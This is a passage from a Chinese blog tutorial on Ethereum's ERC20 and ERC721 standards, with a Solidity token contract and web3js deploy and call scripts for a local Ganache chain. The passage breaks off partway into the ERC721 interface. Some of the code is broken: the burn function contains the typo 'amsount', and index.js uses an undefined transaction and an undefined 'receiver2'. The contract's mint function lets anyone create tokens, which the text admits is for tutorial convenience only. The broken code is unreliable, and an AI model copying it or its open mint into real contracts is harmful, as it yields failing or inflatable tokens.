    <content type="html"><![CDATA[<h2 id="ERC20"><a href="#ERC20" class="headerlink" title="ERC20"></a>ERC20</h2><p><code>ERC20</code>是以太坊上的代币标准，来自2015年11月V神参与的<a href="https://eips.ethereum.org/EIPS/eip-20"><code>EIP20</code></a>。它实现了代币转账的基本逻辑：</p><ul><li>IERC20 totalSupply: 获取该合约内总的 ERC20 Token 总量</li><li>balanceOf: 获取特定账户的 ERC20 Token 总量</li><li>transfer: 向目标账户转移特定数量的 ERC20 Token</li><li>allowance: 获取目标账户能够使用的源账户的 ERC20 Token 数量</li><li>approve: 向目标账户授权, 可以转移指定额度的 ERC20 Token 数量</li><li>transferFrom: ( 第三方调用 ) 从源账户向目标账户转移制定数量的 ERC20 Token</li></ul><h3 id="IERC20"><a href="#IERC20" class="headerlink" title="IERC20"></a>IERC20</h3><p><code>IERC20</code>是<code>ERC20</code>代币标准的接口合约，规定了<code>ERC20</code>代币需要实现的函数和事件。 之所以需要定义接口，是因为有了规范后，就存在所有的<code>ERC20</code>代币都通用的函数名称，输入参数，输出参数。 在接口函数中，只需要定义函数名称，输入参数，输出参数，并不关心函数内部如何实现。 由此，函数就分为内部和外部两个内容，一个重点是实现，另一个是对外接口，约定共同数据。 这就是为什么需要<code>ERC20.sol</code>和<code>IERC20.sol</code>两个文件实现一个合约。</p><h4 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h4><p><code>IERC20</code>定义了<code>2</code>个事件：<code>Transfer</code>事件和<code>Approval</code>事件，分别在转账和授权时被释放</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @dev 释放条件：当 `value` 单位的货币从账户 (`from`) 转账到另一账户 (`to`)时.</span><br><span class="line"> */</span><br><span class="line">event Transfer(address indexed from, address indexed to, uint256 value);</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @dev 释放条件：当 `value` 单位的货币从账户 (`owner`) 授权给另一账户 (`spender`)时.</span><br><span class="line"> */</span><br><span class="line">event Approval(address indexed owner, address indexed spender, uint256 value);</span><br></pre></td></tr></table></figure><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><p><code>IERC20</code>一共定义了 6 个函数，提供了转移代币的基本功能，并允许代币获得批准，以便其他链上第三方使用。</p><ul><li><p>**totalSupply()**返回代币总量</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @dev 返回代币总供给.</span><br><span class="line"> */</span><br><span class="line">function totalSupply() external view returns (uint256);</span><br></pre></td></tr></table></figure></li><li><p>**balanceof()**返回账户余额</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @dev 返回账户`account`所持有的代币数.</span><br><span class="line"> */</span><br><span class="line">function balanceOf(address account) external view returns (uint256);</span><br></pre></td></tr></table></figure></li><li><p>**transfer()**转账操作</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @dev 转账 `amount` 单位代币，从调用者账户到另一账户 `to`.</span><br><span class="line"> *</span><br><span class="line"> * 如果成功，返回 `true`.</span><br><span class="line"> *</span><br><span class="line"> * 释放 &#123;Transfer&#125; 事件.</span><br><span class="line"> */</span><br><span class="line">function transfer(address to, uint256 amount) external returns (bool);</span><br></pre></td></tr></table></figure></li><li><p>**allowance()**返回授权额度</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @dev 返回`owner`账户授权给`spender`账户的额度，默认为0。</span><br><span class="line"> *</span><br><span class="line"> * 当&#123;approve&#125; 或 &#123;transferFrom&#125; 被调用时，`allowance`会改变.</span><br><span class="line"> */</span><br><span class="line">function allowance(address owner, address spender) external view returns (uint256);</span><br></pre></td></tr></table></figure></li><li><p>**approve()**授权</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @dev 调用者账户给`spender`账户授权 `amount`数量代币。</span><br><span class="line"> *</span><br><span class="line"> * 如果成功，返回 `true`.</span><br><span class="line"> *</span><br><span class="line"> * 释放 &#123;Approval&#125; 事件.</span><br><span class="line"> */</span><br><span class="line">function approve(address spender, uint256 amount) external returns (bool);</span><br></pre></td></tr></table></figure></li><li><p>**transferFrom()**授权转账</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @dev 通过授权机制，从`from`账户向`to`账户转账`amount`数量代币。转账的部分会从调用者的`allowance`中扣除。</span><br><span class="line"> *</span><br><span class="line"> * 如果成功，返回 `true`.</span><br><span class="line"> *</span><br><span class="line"> * 释放 &#123;Transfer&#125; 事件.</span><br><span class="line"> */</span><br><span class="line">function transferFrom(</span><br><span class="line">    address from,</span><br><span class="line">    address to,</span><br><span class="line">    uint256 amount</span><br><span class="line">) external returns (bool);</span><br></pre></td></tr></table></figure></li></ul><h3 id="实现ERC20"><a href="#实现ERC20" class="headerlink" title="实现ERC20"></a>实现ERC20</h3><p>我们需要状态变量来记录账户余额，授权额度和代币信息。其中<code>balanceOf</code>, <code>allowance</code>和<code>totalSupply</code>为<code>public</code>类型，会自动生成一个同名<code>getter</code>函数，实现<code>IERC20</code>规定的<code>balanceOf()</code>, <code>allowance()</code>和<code>totalSupply()</code>。而<code>name</code>, <code>symbol</code>, <code>decimals</code>则对应代币的名称，代号和小数位数。</p><p><font color=red>用<code>override</code>修饰<code>public</code>变量，会重写继承自父合约的与变量同名的<code>getter</code>函数，比如<code>IERC20</code>中的<code>balanceOf()</code>函数。</font></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mapping(address =&gt; uint256) public override balanceOf;</span><br><span class="line"></span><br><span class="line">mapping(address =&gt; mapping(address =&gt; uint256)) public override allowance;</span><br><span class="line"></span><br><span class="line">uint256 public override totalSupply;   // 代币总供给</span><br><span class="line"></span><br><span class="line">string public name;   // 名称</span><br><span class="line">string public symbol;  // 代号</span><br><span class="line"></span><br><span class="line">uint8 public decimals = 18; // 小数位数</span><br></pre></td></tr></table></figure><p>下面是实现的合约：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//ERC20.sol</span><br><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity &gt;=0.6.0 &lt;0.9.0;</span><br><span class="line">import &quot;./IERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract ERC20 is IERC20 &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public override balanceOf;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; mapping(address =&gt; uint256)) public override allowance;</span><br><span class="line"></span><br><span class="line">    uint256 public override totalSupply; // 代币总供给</span><br><span class="line"></span><br><span class="line">    string public name; // 名称</span><br><span class="line">    string public symbol; // 代号</span><br><span class="line"></span><br><span class="line">    uint8 public decimals = 18; // 小数位数</span><br><span class="line"></span><br><span class="line">    constructor(string memory _name, string memory _symbol) &#123;</span><br><span class="line">        name = _name;</span><br><span class="line">        symbol = _symbol;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * transfer()</span><br><span class="line">     * 实现IERC20中的transfer函数，代币转账逻辑。</span><br><span class="line">     * 调用方扣除amount数量代币，接收方增加相应代币。</span><br><span class="line">     */</span><br><span class="line">    function transfer(address recipient, uint amount)</span><br><span class="line">        external</span><br><span class="line">        override</span><br><span class="line">        returns (bool)</span><br><span class="line">    &#123;</span><br><span class="line">        balanceOf[msg.sender] -= amount;</span><br><span class="line">        balanceOf[recipient] += amount;</span><br><span class="line">        emit Transfer(msg.sender, recipient, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * approve()</span><br><span class="line">     * 实现IERC20中的approve函数，代币授权逻辑。被授权方spender可以支配授权方(调用者)的amount数量的代币。</span><br><span class="line">     * spender可以是EOA账户，也可以是合约账户：当你用uniswap交易代币时，你需要将代币授权给uniswap合约。</span><br><span class="line">     */</span><br><span class="line">    function approve(address spender, uint amount)</span><br><span class="line">        external</span><br><span class="line">        override</span><br><span class="line">        returns (bool)</span><br><span class="line">    &#123;</span><br><span class="line">        allowance[msg.sender][spender] = amount;</span><br><span class="line">        emit Approval(msg.sender, spender, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * transferFrom()</span><br><span class="line">     * 实现IERC20中的授权转账逻辑，被授权方sender的amount数量的代币给接收方recipient(使用的是授权者账户中的代币)</span><br><span class="line">     */</span><br><span class="line">    function transferFrom(</span><br><span class="line">        address sender,</span><br><span class="line">        address recipient,</span><br><span class="line">        uint amount</span><br><span class="line">    ) external override returns (bool) &#123;</span><br><span class="line">        allowance[sender][msg.sender] -= amount;</span><br><span class="line">        balanceOf[sender] -= amount;</span><br><span class="line">        balanceOf[recipient] += amount;</span><br><span class="line">        emit Transfer(sender, recipient, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * mint()函数：铸造代币函数，不在IERC20标准中。</span><br><span class="line">     * 这里为了教程方便，任何人可以铸造任意数量的代币，实际应用中会加权限管理，只有owner可以铸造代币：</span><br><span class="line">     */</span><br><span class="line"></span><br><span class="line">    function mint(uint amount) external &#123;</span><br><span class="line">        balanceOf[msg.sender] += amount;</span><br><span class="line">        totalSupply += amount;</span><br><span class="line">        emit Transfer(address(0), msg.sender, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * burn()销毁代币函数，不在IERC20标准中。</span><br><span class="line">     */</span><br><span class="line">    function burn(uint amount) external &#123;</span><br><span class="line">        balanceOf[msg.sender] -= amount;</span><br><span class="line">        totalSupply -= amsount;</span><br><span class="line">        emit Transfer(msg.sender, address(0), amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//IERC20.sol</span><br><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">// WTF Solidity by 0xAA</span><br><span class="line"></span><br><span class="line">pragma solidity &gt;=0.6.0 &lt;0.9.0;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @dev ERC20 接口合约.</span><br><span class="line"> */</span><br><span class="line">interface IERC20 &#123;</span><br><span class="line">    /**</span><br><span class="line">     * @dev 释放条件：当 `value` 单位的货币从账户 (`from`) 转账到另一账户 (`to`)时.</span><br><span class="line">     */</span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint256 value);</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev 释放条件：当 `value` 单位的货币从账户 (`owner`) 授权给另一账户 (`spender`)时.</span><br><span class="line">     */</span><br><span class="line">    event Approval(</span><br><span class="line">        address indexed owner,</span><br><span class="line">        address indexed spender,</span><br><span class="line">        uint256 value</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev 返回代币总供给.</span><br><span class="line">     */</span><br><span class="line">    function totalSupply() external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev 返回账户`account`所持有的代币数.</span><br><span class="line">     */</span><br><span class="line">    function balanceOf(address account) external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev 转账 `amount` 单位代币，从调用者账户到另一账户 `to`.</span><br><span class="line">     *</span><br><span class="line">     * 如果成功，返回 `true`.</span><br><span class="line">     *</span><br><span class="line">     * 释放 &#123;Transfer&#125; 事件.</span><br><span class="line">     */</span><br><span class="line">    function transfer(address to, uint256 amount) external returns (bool);</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev 返回`owner`账户授权给`spender`账户的额度，默认为0。</span><br><span class="line">     *</span><br><span class="line">     * 当&#123;approve&#125; 或 &#123;transferFrom&#125; 被调用时，`allowance`会改变.</span><br><span class="line">     */</span><br><span class="line">    function allowance(address owner, address spender)</span><br><span class="line">        external</span><br><span class="line">        view</span><br><span class="line">        returns (uint256);</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev 调用者账户给`spender`账户授权 `amount`数量代币。</span><br><span class="line">     *</span><br><span class="line">     * 如果成功，返回 `true`.</span><br><span class="line">     *</span><br><span class="line">     * 释放 &#123;Approval&#125; 事件.</span><br><span class="line">     */</span><br><span class="line">    function approve(address spender, uint256 amount) external returns (bool);</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev 通过授权机制，从`from`账户向`to`账户转账`amount`数量代币。转账的部分会从调用者的`allowance`中扣除。</span><br><span class="line">     *</span><br><span class="line">     * 如果成功，返回 `true`.</span><br><span class="line">     *</span><br><span class="line">     * 释放 &#123;Transfer&#125; 事件.</span><br><span class="line">     */</span><br><span class="line">    function transferFrom(</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 amount</span><br><span class="line">    ) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="使用-web3js-调用ERC20"><a href="#使用-web3js-调用ERC20" class="headerlink" title="使用 web3js 调用ERC20"></a>使用 web3js 调用ERC20</h3><p>在这里使用Ganache搭建的虚拟环境</p><p><img src="solidity%E5%BA%94%E7%94%A8.assets/image-20221110215538178.png" alt="image-20221110215538178"></p><p><code>compile.js</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">let Web3 = require(&#x27;web3&#x27;)</span><br><span class="line">let solc = require(&#x27;solc&#x27;)</span><br><span class="line">let fs = require(&#x27;fs&#x27;)</span><br><span class="line"></span><br><span class="line">async function deployContract () &#123;</span><br><span class="line">    //首先读取文件</span><br><span class="line">    const source = fs.readFileSync(&#x27;ERC20.sol&#x27;, &#x27;utf8&#x27;)</span><br><span class="line"></span><br><span class="line">    // Get Path and Load Contract</span><br><span class="line">    function findImports (path) &#123;</span><br><span class="line">        if (fs.existsSync(path)) &#123;</span><br><span class="line">            return &#123;</span><br><span class="line">                contents: fs.readFileSync(path, &#x27;utf8&#x27;),</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else if (fs.existsSync(&#x27;./node_modules/&#x27; + path)) &#123;</span><br><span class="line">            return &#123;</span><br><span class="line">                contents: fs.readFileSync(&#x27;./node_modules/&#x27; + path, &#x27;utf8&#x27;),</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return &#123; error: &#x27;File not found&#x27; &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    const input = &#123;</span><br><span class="line">        language: &#x27;Solidity&#x27;,</span><br><span class="line">        sources: &#123;</span><br><span class="line">            &#x27;ERC20.sol&#x27;: &#123;</span><br><span class="line">                content: source,</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;,</span><br><span class="line">        settings: &#123;</span><br><span class="line">            outputSelection: &#123;</span><br><span class="line">                &#x27;*&#x27;: &#123;</span><br><span class="line">                    &#x27;*&#x27;: [&#x27;*&#x27;],</span><br><span class="line">                &#125;,</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;</span><br><span class="line">    const tempFile = JSON.parse(</span><br><span class="line">        solc.compile(JSON.stringify(input), &#123; import: findImports &#125;)</span><br><span class="line">    )</span><br><span class="line">    const contractFile = tempFile.contracts[&#x27;ERC20.sol&#x27;][&#x27;ERC20&#x27;]</span><br><span class="line"></span><br><span class="line">    // Export Contract Data</span><br><span class="line">    module.exports = contractFile</span><br><span class="line">    console.log(&quot;Compile Success!&quot;)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">deployContract().catch((error) =&gt; &#123;</span><br><span class="line">    console.error(error)</span><br><span class="line">    process.exitCode = 1</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>index.js</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const Web3 = require(&#x27;web3&#x27;)</span><br><span class="line">const fs = require(&#x27;fs&#x27;)</span><br><span class="line">const contractFile = require(&#x27;./compile&#x27;)</span><br><span class="line"></span><br><span class="line">require(&#x27;dotenv&#x27;).config()</span><br><span class="line">const privateKey = process.env.PRIVATE_KEY</span><br><span class="line"></span><br><span class="line">//设置收款账户</span><br><span class="line">const receiver = &#x27;0x48a5B46E63aACd0EC6cDa708507C52e8C9bee33a&#x27;</span><br><span class="line"></span><br><span class="line">//构造web3对象</span><br><span class="line">const web3 = new Web3(new Web3.providers.HttpProvider(&quot;http://127.0.0.1:7545&quot;))</span><br><span class="line">// const providerRPC = &#123;</span><br><span class="line">//     development: &quot;http://127.0.0.1:8545&quot;</span><br><span class="line">// &#125;</span><br><span class="line">// const web3 = new Web3(providerRPC.development)</span><br><span class="line"></span><br><span class="line">//获取账户地址</span><br><span class="line">const account = web3.eth.accounts.privateKeyToAccount(privateKey)</span><br><span class="line">const account_from = &#123;</span><br><span class="line">    privateKey: account.privateKey,</span><br><span class="line">    accountAddress: account.address</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">console.log(account_from)</span><br><span class="line"></span><br><span class="line">//获取abi和bytecode</span><br><span class="line">const bytecode = contractFile.evm.bytecode.object</span><br><span class="line">const abi = contractFile.abi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">const Trans = async () =&gt; &#123;</span><br><span class="line">    //部署合约</span><br><span class="line">    console.log()</span><br><span class="line">    console.log(&#x27;============================ 0. Deploy Contract&#x27;)</span><br><span class="line">    console.log(</span><br><span class="line">        `Attempting to deploy from account $&#123;account_from.accountAddress&#125;`</span><br><span class="line">    )</span><br><span class="line">    web3.eth.getBlockNumber(function (error, result) &#123;</span><br><span class="line">        console.log(result)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    //使用对应的 abi 构造相应的合约实例</span><br><span class="line">    const deployContract = new web3.eth.Contract(abi)</span><br><span class="line"></span><br><span class="line">    //创建部署合约的交易</span><br><span class="line">    const deployTx = deployContract.deploy(&#123;</span><br><span class="line">        data: bytecode,</span><br><span class="line">        arguments: [&#x27;DAPPLEARNING&#x27;, &#x27;DAPP&#x27;],</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    //交易签名</span><br><span class="line">    const deployTransaction = await web3.eth.accounts.signTransaction(</span><br><span class="line">        &#123;</span><br><span class="line">            data: deployTx.encodeABI(),</span><br><span class="line">            gas: 6700000</span><br><span class="line">        &#125;,</span><br><span class="line">        account_from.privateKey</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //发送交易并获取交易回执</span><br><span class="line">    const deployReceipt = await web3.eth.sendSignedTransaction(deployTransaction.rawTransaction)</span><br><span class="line">    contractAddr = deployReceipt.contractAddress</span><br><span class="line">    console.log(`Contract deployed at address: $&#123;deployReceipt.contractAddress&#125;`)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //----------------------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line">    const web3Socket = new Web3(</span><br><span class="line">        new Web3.providers.WebsocketProvider(</span><br><span class="line">            &#x27;http://127.0.0.1:7545&#x27;</span><br><span class="line">        )</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    erc20 = new web3Socket.eth.Contract(abi, deployReceipt.contractAddress)</span><br><span class="line"></span><br><span class="line">    erc20.events.Transfer(function (error, event) &#123;</span><br><span class="line">        console.log(&#x27;Mint Success&#x27;)</span><br><span class="line">        console.log(event.returnValues)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    erc20.events.Approval(function (error, event) &#123;</span><br><span class="line">        console.log(&#x27;Approval Success&#x27;)</span><br><span class="line">        console.log(event.returnValues)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //----------------------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //创建合约实例</span><br><span class="line">    const erc20Contract = new web3.eth.Contract(</span><br><span class="line">        abi,</span><br><span class="line">        deployReceipt.contractAddress</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    //创建交易 mint铸造token</span><br><span class="line">    console.log()</span><br><span class="line">    console.log(&#x27;============================ 1. Mint&#x27;)</span><br><span class="line"></span><br><span class="line">    const mintTx = erc20Contract.methods</span><br><span class="line">        .mint(100000)</span><br><span class="line">        .encodeABI()</span><br><span class="line"></span><br><span class="line">    const mintTransaction = await web3.eth.accounts.signTransaction(</span><br><span class="line">        &#123;</span><br><span class="line">            to: deployReceipt.contractAddress,</span><br><span class="line">            data: mintTx,</span><br><span class="line">            gas: 6700000,</span><br><span class="line">        &#125;,</span><br><span class="line">        account_from.privateKey</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    await web3.eth.sendSignedTransaction(</span><br><span class="line">        mintTransaction.rawTransaction</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    await erc20Contract.methods</span><br><span class="line">        .balanceOf(account.address)</span><br><span class="line">        .call()</span><br><span class="line">        .then((result) =&gt; &#123;</span><br><span class="line">            console.log(`The balance of account is $&#123;result&#125;`)</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //授权</span><br><span class="line">    console.log()</span><br><span class="line">    console.log(&#x27;============================ 2. Approval&#x27;)</span><br><span class="line">    const approvalTx = erc20Contract.methods.approve(receiver, 666).encodeABI()</span><br><span class="line"></span><br><span class="line">    const approvalTransaction = await web3.eth.accounts.signTransaction(</span><br><span class="line">        &#123;</span><br><span class="line">            to: contractAddr,</span><br><span class="line">            data: approvalTx,</span><br><span class="line">            gas: 6700000</span><br><span class="line">        &#125;,</span><br><span class="line">        account_from.privateKey</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    await web3.eth.sendSignedTransaction(approvalTransaction.rawTransaction)         //发送交易</span><br><span class="line"></span><br><span class="line">    let allowance = await erc20Contract.methods.allowance(account.address, receiver).call()</span><br><span class="line">    console.log(`allowance[$&#123;account.address&#125;][$&#123;receiver&#125;]:$&#123;allowance&#125;`)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //使用授权转账</span><br><span class="line">    console.log()</span><br><span class="line">    console.log(&#x27;============================ 3. TransferFrom&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    await web3.eth.sendSignedTransaction(transferFromTransaction.rawTransaction)     //发送交易</span><br><span class="line"></span><br><span class="line">    balance = await erc20Contract.methods.balanceOf(account.address).call()</span><br><span class="line">    console.log(`balanceOf[$&#123;account.address&#125;]:$&#123;balance&#125;`)</span><br><span class="line"></span><br><span class="line">    balance = await erc20Contract.methods.balanceOf(receiver2).call()</span><br><span class="line">    console.log(`balanceOf[$&#123;receiver2&#125;]:$&#123;balance&#125;`)</span><br><span class="line"></span><br><span class="line">    balance = await erc20Contract.methods.balanceOf(receiver).call()</span><br><span class="line">    console.log(`balanceOf[$&#123;receiver&#125;]:$&#123;balance&#125;`)</span><br><span class="line"></span><br><span class="line">    allowance = await erc20Contract.methods.allowance(account.address, receiver).call()</span><br><span class="line">    console.log(`allowance[$&#123;account.address&#125;][$&#123;receiver&#125;]:$&#123;allowance&#125;`)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Trans().then(() =&gt; process.exit(0)).catch((error) =&gt; &#123;</span><br><span class="line">    console.error(error)</span><br><span class="line">    process.exit(1)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="ERC72"><a href="#ERC72" class="headerlink" title="ERC72"></a>ERC72</h2><p><code>BTC</code>和<code>ETH</code>这类代币都属于同质化代币，矿工挖出的第<code>1</code>枚<code>BTC</code>与第<code>10000</code>枚<code>BTC</code>并没有不同，是等价的。但世界中很多物品是不同质的，其中包括房产、古董、虚拟艺术品等等，这类物品无法用同质化代币抽象。因此，<a href="https://eips.ethereum.org/EIPS/eip-721">以太坊EIP721</a>提出了<code>ERC721</code>标准，来抽象非同质化的物品。这一讲，我们将介绍<code>ERC721</code>标准，并基于它发行一款<code>NFT</code>。</p><h4 id="EIP"><a href="#EIP" class="headerlink" title="EIP"></a>EIP</h4><p><code>EIP</code>全称 <code>Ethereum Imporvement Proposals</code>(以太坊改进建议), 是以太坊开发者社区提出的改进建议, 是一系列以编号排定的文件, 类似互联网上IETF的RFC。</p><p><code>EIP</code>可以是 <code>Ethereum</code> 生态中任意领域的改进, 比如新特性、ERC、协议改进、编程工具等等。</p><p><code>ERC</code>全称 Ethereum Request For Comment (以太坊意见征求稿), 用以记录以太坊上应用级的各种开发标准和协议。如典型的Token标准(<code>ERC20</code>, <code>ERC721</code>)、名字注册(<code>ERC26</code>, <code>ERC13</code>), URI范式(<code>ERC67</code>), Library/Package格式(<code>EIP82</code>), 钱包格式(<code>EIP75</code>,<code>EIP85</code>)。</p><p>ERC协议标准是影响以太坊发展的重要因素, 像<code>ERC20</code>, <code>ERC223</code>, <code>ERC721</code>, <code>ERC777</code>等, 都是对以太坊生态产生了很大影响。</p><p>所以最终结论：<code>EIP</code>包含<code>ERC</code>。</p><h4 id="ERC165"><a href="#ERC165" class="headerlink" title="ERC165"></a>ERC165</h4><p>通过<a href="https://eips.ethereum.org/EIPS/eip-165">ERC165标准</a>，智能合约可以声明它支持的接口，供其他合约检查。简单的说，ERC165就是检查一个智能合约是不是支持了<code>ERC721</code>，<code>ERC1155</code>的接口。</p><p><code>IERC165</code>接口合约只声明了一个<code>supportsInterface</code>函数，输入要查询的<code>interfaceId</code>接口id，若合约实现了该接口id，则返回<code>true</code>：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">interface IERC165 &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@dev </span>如果合约实现了查询的`interfaceId`，则返回true</span></span><br><span class="line"><span class="comment">     * 规则详见：https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">supportsInterface</span>(<span class="params">bytes4 interfaceId</span>) <span class="title">external</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">bool</span>)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看下<code>ERC721</code>是如何实现<code>supportsInterface()</code>函数的：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">supportsInterface</span>(<span class="params">bytes4 interfaceId</span>) <span class="title">external</span> <span class="title">pure</span> <span class="title">override</span> <span class="title">returns</span> (<span class="params">bool</span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">return</span></span><br><span class="line">           interfaceId == type(IERC721).interfaceId ||</span><br><span class="line">           interfaceId == type(IERC165).interfaceId;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>当查询的是<code>IERC721</code>或<code>IERC165</code>的接口id时，返回<code>true</code>；反之返回<code>false</code>。</p><h4 id="IERC721"><a href="#IERC721" class="headerlink" title="IERC721"></a>IERC721</h4><p><code>IERC721</code>是<code>ERC721</code>标准的接口合约，规定了<code>ERC721</code>要实现的基本函数。它利用<code>tokenId</code>来表示特定的非同质化代币，授权或转账都要明确<code>tokenId</code>；而<code>ERC20</code>只需要明确转账的数额即可。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @dev ERC721标准接口.</span><br><span class="line"> */</span><br><span class="line">interface IERC721 is IERC165 &#123;</span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);</span><br><span class="line">    event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);</span><br><span class="line">    event ApprovalForAll(address indexed owner, address indexed operator, bool approved);</span><br><span class="line"></span><br><span class="line">    function balanceOf(address owner) external view returns (uint256 balance);</span><br><span class="line"></span><br><span class="line">    function ownerOf(uint256 tokenId) external view returns (address owner);</span><br><span class="line"></span><br><span class="line">    function safeTransferFrom(</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 tokenId,</span><br><span class="line">        bytes calldata data</span><br><span class="line">    ) external;</span><br><span class="line"></span><br><span class="line">    function safeTransferFrom(</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 tokenId</span><br><span class="line">    ) external;</span><br><span class="line"></span><br><span class="line">    function transferFrom(</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 tokenId</span><br><span class="line">    ) external;</span><br><span class="line"></span><br><span class="line">    function approve(address to, uint256 tokenId) external;</span><br><span class="line"></span><br><span class="line">    function setApprovalForAll(address operator, bool _approved) external;</span><br><span class="line"></span><br><span class="line">    function getApproved(uint256 tokenId) external view returns (address operator);</span><br><span class="line"></span><br><span class="line">    function isApprovedForAll(address owner, address operator) external view returns (bool);</span><br></pre></td></tr></table></figure><h5 id="IERC721事件"><a href="#IERC721事件" class="headerlink" 